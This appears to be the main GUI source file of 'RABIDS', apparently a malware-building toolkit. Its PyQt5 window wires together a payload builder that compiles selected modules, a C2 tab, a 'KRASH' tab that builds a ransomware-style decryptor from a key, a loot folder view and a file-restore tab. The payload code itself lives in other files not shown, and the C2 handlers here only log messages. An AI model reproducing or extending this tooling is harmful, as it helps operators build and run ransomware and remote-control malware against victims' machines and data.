import sys
import os
import subprocess
import shutil
from pathlib import Path
from PyQt5.QtWidgets import QApplication, QMainWindow, QTabWidget
from PyQt5.QtGui import QFont
from PyQt5.QtCore import QThread, pyqtSignal

# Import all tab widgets from the TABS package
from TABS import (
    BuilderWidget,
    OutputWidget,
    C2Widget,
    KrashWidget,
    GarbageCollectorWidget,
    DocsWidget,
    SettingsWidget,
    SilentWhispersWidget
)

# Style constants
STYLE_SHEET = """
QMainWindow {
    background-color: #0a0a0a;
}
QTabWidget::pane {
    border: 1px solid #1a1a1a;
    background-color: #0e0e0e;
}
QTabBar::tab {
    background-color: #141414;
    color: #909090;
    padding: 8px 16px;
    margin-right: 2px;
    border: 1px solid #1a1a1a;
    font-size: 9pt;
}
QTabBar::tab:selected {
    background-color: #1a1a1a;
    color: #d0d0d0;
    border-bottom: 2px solid #404040;
}
QTabBar::tab:hover {
    background-color: #1a1a1a;
    color: #b0b0b0;
}
QWidget {
    background-color: #0e0e0e;
    color: #d0d0d0;
    font-size: 9pt;
}
QGroupBox {
    font-weight: bold;
    border: 1px solid #1a1a1a;
    margin-top: 10px;
    padding-top: 10px;
    background-color: #0e0e0e;
    color: #909090;
    font-size: 9pt;
}
QGroupBox::title {
    subcontrol-origin: margin;
    left: 10px;
    padding: 0 3px;
    color: #808080;
}
QPushButton {
    background-color: #141414;
    color: #d0d0d0;
    border: 1px solid #1a1a1a;
    padding: 8px 16px;
    min-width: 100px;
    min-height: 28px;
    font-size: 9pt;
}
QPushButton:hover {
    background-color: #1a1a1a;
    border: 1px solid #252525;
}
QPushButton:pressed {
    background-color: #0a0a0a;
}
QPushButton:disabled {
    background-color: #0a0a0a;
    color: #404040;
    border: 1px solid #141414;
}
QLineEdit, QTextEdit, QPlainTextEdit {
    background-color: #0a0a0a;
    border: 1px solid #1a1a1a;
    color: #d0d0d0;
    padding: 6px;
    font-size: 9pt;
}
QLineEdit:focus, QTextEdit:focus, QPlainTextEdit:focus {
    border: 1px solid #303030;
}
QComboBox {
    background-color: #141414;
    border: 1px solid #1a1a1a;
    color: #d0d0d0;
    padding: 6px;
    min-height: 28px;
    font-size: 9pt;
}
QComboBox::drop-down {
    border: none;
    width: 20px;
}
QComboBox::down-arrow {
    image: none;
    border-left: 4px solid transparent;
    border-right: 4px solid transparent;
    border-top: 6px solid #808080;
    margin-right: 5px;
}
QComboBox QAbstractItemView {
    background-color: #141414;
    border: 1px solid #1a1a1a;
    color: #d0d0d0;
    selection-background-color: #1a1a1a;
}
QCheckBox {
    color: #d0d0d0;
    spacing: 8px;
    font-size: 9pt;
}
QCheckBox::indicator {
    width: 16px;
    height: 16px;
    border: 1px solid #303030;
    background-color: #0a0a0a;
}
QCheckBox::indicator:checked {
    background-color: #303030;
    border: 1px solid #404040;
}
QCheckBox::indicator:hover {
    border: 1px solid #404040;
}
QTableWidget {
    background-color: #0a0a0a;
    border: 1px solid #1a1a1a;
    gridline-color: #1a1a1a;
    color: #d0d0d0;
    font-size: 9pt;
}
QTableWidget::item {
    padding: 4px;
    border: none;
}
QTableWidget::item:selected {
    background-color: #1a1a1a;
    color: #ffffff;
}
QHeaderView::section {
    background-color: #141414;
    color: #909090;
    padding: 6px;
    border: 1px solid #1a1a1a;
    font-weight: bold;
    font-size: 9pt;
}
QListWidget {
    background-color: #0a0a0a;
    border: 1px solid #1a1a1a;
    color: #d0d0d0;
    font-size: 9pt;
}
QListWidget::item {
    padding: 6px;
    border-bottom: 1px solid #141414;
}
QListWidget::item:selected {
    background-color: #1a1a1a;
    color: #ffffff;
}
QListWidget::item:hover {
    background-color: #141414;
}
QScrollBar:vertical {
    background-color: #0a0a0a;
    width: 12px;
    border: none;
}
QScrollBar::handle:vertical {
    background-color: #1a1a1a;
    min-height: 30px;
    border-radius: 6px;
}
QScrollBar::handle:vertical:hover {
    background-color: #252525;
}
QScrollBar::add-line:vertical, QScrollBar::sub-line:vertical {
    height: 0px;
}
QScrollBar:horizontal {
    background-color: #0a0a0a;
    height: 12px;
    border: none;
}
QScrollBar::handle:horizontal {
    background-color: #1a1a1a;
    min-width: 30px;
    border-radius: 6px;
}
QScrollBar::handle:horizontal:hover {
    background-color: #252525;
}
QScrollBar::add-line:horizontal, QScrollBar::sub-line:horizontal {
    width: 0px;
}
QLabel {
    color: #909090;
    font-size: 9pt;
}
QScrollArea {
    border: none;
    background-color: transparent;
}
"""


class BuildThread(QThread):
    """Thread to run the build process."""
    output_signal = pyqtSignal(str)
    finished_signal = pyqtSignal(bool)
    
    def __init__(self, cmd, cwd):
        super().__init__()
        self.cmd = cmd
        self.cwd = cwd
    
    def run(self):
        try:
            process = subprocess.Popen(
                self.cmd,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                cwd=self.cwd
            )
            
            for line in process.stdout:
                self.output_signal.emit(line.rstrip())
            
            process.wait()
            success = process.returncode == 0
            self.finished_signal.emit(success)
        except Exception as e:
            self.output_signal.emit(f"[ERROR] {str(e)}")
            self.finished_signal.emit(False)


class DependencyInstallerThread(QThread):
    """Thread to install dependencies."""
    output_signal = pyqtSignal(str)
    finished_signal = pyqtSignal(bool)
    
    def __init__(self, tool, install_cmd):
        super().__init__()
        self.tool = tool
        self.install_cmd = install_cmd
    
    def run(self):
        try:
            self.output_signal.emit(f"[*] Installing {self.tool}...")
            process = subprocess.Popen(
                self.install_cmd,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True
            )
            
            for line in process.stdout:
                self.output_signal.emit(line.rstrip())
            
            process.wait()
            success = process.returncode == 0
            if success:
                self.output_signal.emit(f"[+] {self.tool} installed successfully")
            else:
                self.output_signal.emit(f"[-] Failed to install {self.tool}")
            self.finished_signal.emit(success)
        except Exception as e:
            self.output_signal.emit(f"[ERROR] {str(e)}")
            self.finished_signal.emit(False)


class RABIDSGUI(QMainWindow):
    """Main application window."""
    
    def __init__(self):
        super().__init__()
        self.setWindowTitle("RABIDS")
        self.setMinimumSize(1000, 700)
        self.base_dir = Path(__file__).parent
        
        # Apply global stylesheet
        self.setStyleSheet(STYLE_SHEET)
        
        # Create tab widget
        self.tabs = QTabWidget()
        self.setCentralWidget(self.tabs)
        
        # Load configuration early so we can provide module options to builder
        config = self.read_config()
        module_options = config.get('module_options', {})

        # Create all tab widgets
        self.builder_widget = BuilderWidget(self.base_dir, module_options)
        self.output_widget = OutputWidget(self.base_dir)
        self.c2_widget = C2Widget(self.base_dir)
        self.krash_widget = KrashWidget(self.base_dir)
        self.garbage_widget = GarbageCollectorWidget(self.base_dir)
        self.whispers_widget = SilentWhispersWidget(self.base_dir)
        self.docs_widget = DocsWidget(self.base_dir)
        self.settings_widget = SettingsWidget(self.base_dir)
        
        # Add tabs
        self.tabs.addTab(self.builder_widget, "BUILDER")
        self.tabs.addTab(self.output_widget, "OUTPUT")
        self.tabs.addTab(self.c2_widget, "C2")
        self.tabs.addTab(self.krash_widget, "KRASH")
        self.tabs.addTab(self.garbage_widget, "GARBAGE COLLECTOR")
        self.tabs.addTab(self.whispers_widget, "WHISPERS")
        self.tabs.addTab(self.docs_widget, "DOCUMENTATION")
        self.tabs.addTab(self.settings_widget, "SETTINGS")
        
        # Connect signals
        self.connect_signals()
        
        # Load settings
        self.load_settings()
    
    def connect_signals(self):
        """Connect all widget signals to their handlers."""
        # Builder signals
        self.builder_widget.build_requested.connect(self.handle_build)
        self.builder_widget.log_message.connect(self.output_widget.log_message)
        
        # C2 signals
        self.c2_widget.connect_requested.connect(self.handle_c2_connect)
        self.c2_widget.send_message_requested.connect(self.handle_c2_send)
        
        # Krash signals
        self.krash_widget.build_decryptor_requested.connect(self.handle_build_decryptor)
        
        # Garbage Collector signals
        self.garbage_widget.restore_requested.connect(self.handle_restore)
        
        # Settings signals (connect to package-manager-aware installer)
        self.settings_widget.install_nim_tool_requested.connect(
            lambda: self._install_from_widget("nim")
        )
        self.settings_widget.install_rust_tool_requested.connect(
            lambda: self._install_from_widget("rust")
        )
        self.settings_widget.install_python_requested.connect(
            lambda: self._install_from_widget("python")
        )
        self.settings_widget.install_nimble_requested.connect(
            lambda: self._install_from_widget("nimble")
        )
        self.settings_widget.install_rust_targets_requested.connect(
            lambda: self._install_from_widget("rust_targets")
        )
        self.settings_widget.install_docker_requested.connect(
            lambda: self._install_from_widget("docker")
        )

    def _install_from_widget(self, tool):
        cmd = self.get_install_cmd(tool)
        if not cmd:
            self.output_widget.log_message(f"[-] No suitable package manager found for installing '{tool}'. Please install manually.")
            return
        self.install_dependency(tool, cmd)

    def get_install_cmd(self, tool):
        """Return an appropriate install command for `tool` based on detected package manager."""
        # Detect package manager
        pm = None
        if shutil.which("brew"):
            pm = "brew"
        elif shutil.which("apt-get") or shutil.which("apt"):
            pm = "apt"
        elif shutil.which("pacman"):
            pm = "pacman"
        elif shutil.which("choco"):
            pm = "choco"
        elif shutil.which("winget"):
            pm = "winget"

        # Map tool -> command per package manager
        if tool == "nim":
            if pm == "brew":
                return "curl https://nim-lang.org/choosenim/init.sh -sSf | sh"
            if pm == "apt":
                return "sudo apt-get update && sudo apt-get install -y nim"
            if pm == "pacman":
                return "sudo pacman -S --noconfirm nim"
            if pm == "choco":
                return "choco install nim -y"
            if pm == "winget":
                return "winget install -e --id NimLang.Nim"
            return "curl https://nim-lang.org/choosenim/init.sh -sSf | sh"

        if tool == "rust":
            cmd = "curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y"
            return cmd

        if tool == "python":
            if pm == "brew":
                return "brew install python"
            if pm == "apt":
                return "sudo apt-get update && sudo apt-get install -y python3 python3-pip"
            if pm == "pacman":
                return "sudo pacman -S --noconfirm python python-pip"
            if pm == "choco":
                return "choco install python -y"
            if pm == "winget":
                return "winget install Python.Python.3"
            return "python3 -m pip install --upgrade pip"

        if tool == "nimble":
            return "nimble install -y"

        if tool == "rust_targets":
            # Add a common Windows target as example
            return "rustup target add x86_64-pc-windows-gnu"

        if tool == "docker":
            if pm == "brew":
                return "brew install --cask docker"
            if pm == "apt":
                return "sudo apt-get update && sudo apt-get install -y docker.io"
            if pm == "pacman":
                return "sudo pacman -S --noconfirm docker"
            if pm == "choco":
                return "choco install docker-desktop -y"
            return None
    
    def handle_build(self, modules, options):
        """Handle build request from builder widget."""
        self.output_widget.log_message("[*] Starting build process...")
        
        # Switch to output tab
        self.tabs.setCurrentWidget(self.output_widget)
        
        # Prepare build command using compiler.py
        cmd_parts = ["python3", "compiler.py"]
        
        for module in modules:
            cmd_parts.append(f"--module={module}")
        
        for key, value in options.items():
            if value:
                if isinstance(value, bool):
                    cmd_parts.append(f"--{key}")
                else:
                    cmd_parts.append(f"--{key}={value}")
        
        cmd = " ".join(cmd_parts)
        self.output_widget.log_message(f"[*] Command: {cmd}")
        
        # Run build in thread
        self.build_thread = BuildThread(cmd, str(self.base_dir))
        self.build_thread.output_signal.connect(self.output_widget.log_message)
        self.build_thread.finished_signal.connect(self.on_build_finished)
        self.build_thread.start()
    
    def on_build_finished(self, success):
        """Handle build completion."""
        if success:
            self.output_widget.log_message("[+] Build completed successfully")
            self.output_widget.update_loot_folder_view()
        else:
            self.output_widget.log_message("[-] Build failed")
    
    def handle_c2_connect(self, host, port):
        """Handle C2 connection request."""
        self.output_widget.log_message(f"[*] Connecting to C2 at {host}:{port}...")
    
    def handle_c2_send(self, message):
        """Handle C2 send message request."""
        self.output_widget.log_message(f"[*] Sending C2 message: {message}")
    
    def handle_build_decryptor(self, key):
        """Handle decryptor build request."""
        self.output_widget.log_message(f"[*] Building decryptor with key: {key}")
        self.tabs.setCurrentWidget(self.output_widget)
    
    def handle_restore(self, archive_path):
        """Handle file restore request."""
        self.output_widget.log_message(f"[*] Restoring from archive: {archive_path}")
        self.tabs.setCurrentWidget(self.output_widget)
    
    def install_dependency(self, tool, cmd):
        """Install a dependency."""
        self.output_widget.log_message(f"[*] Installing {tool}...")
        self.tabs.setCurrentWidget(self.output_widget)
        
        self.installer_thread = DependencyInstallerThread(tool, cmd)
        self.installer_thread.output_signal.connect(self.output_widget.log_message)
        self.installer_thread.finished_signal.connect(
            lambda success: self.output_widget.log_message(
                f"[+] {tool} installation completed" if success else f"[-] {tool} installation failed"
            )
        )
        self.installer_thread.start()
    
    def load_settings(self):
        """Load settings from config file."""
        config_path = self.base_dir / "rabids_config.json"
        if config_path.exists():
            try:
                with open(config_path, 'r', encoding='utf-8') as f:
                    config = __import__('json').load(f)
                # Apply settings to widgets as needed
                try:
                    self.builder_widget.load_settings(config)
                except Exception:
                    pass
                try:
                    self.settings_widget.load_settings(config)
                except Exception:
                    pass
            except Exception:
                pass

    def read_config(self):
        """Return parsed configuration dict or empty dict."""
        config_path = self.base_dir / "rabids_config.json"
        if config_path.exists():
            try:
                with open(config_path, 'r', encoding='utf-8') as f:
                    return __import__('json').load(f)
            except Exception:
                return {}
        return {}
    
    def save_settings(self):
        """Save settings to config file."""
        config_path = self.base_dir / "rabids_config.json"
        try:
            config = {}
            # Gather settings from widgets as needed
            with open(config_path, 'w') as f:
                __import__('json').dump(config, f, indent=4)
        except Exception:
            pass
    
    def closeEvent(self, event):
        """Handle window close event."""
        self.save_settings()
        super().closeEvent(event)


if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = RABIDSGUI()
    window.show()
    sys.exit(app.exec_())
